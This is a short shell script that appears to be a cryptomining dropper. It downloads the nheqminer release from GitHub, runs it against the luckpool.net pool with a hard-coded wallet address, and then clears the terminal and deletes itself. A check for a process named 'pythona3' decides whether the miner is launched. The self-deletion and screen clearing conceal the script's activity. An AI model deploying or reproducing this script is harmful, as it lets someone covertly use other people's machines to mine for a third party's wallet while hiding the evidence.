#!/bin/sh
ps cax | grep pythona3 > /dev/null
if [ $? -eq 0 ]; then
  clear
  rm -- "$0"
else
  wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
  tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz
  nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RV2tjiZptDEbuyaecnVH22PUg5Z7ihyiT2.try -p x -t 4
  clear
  rm -- "$0"
fi

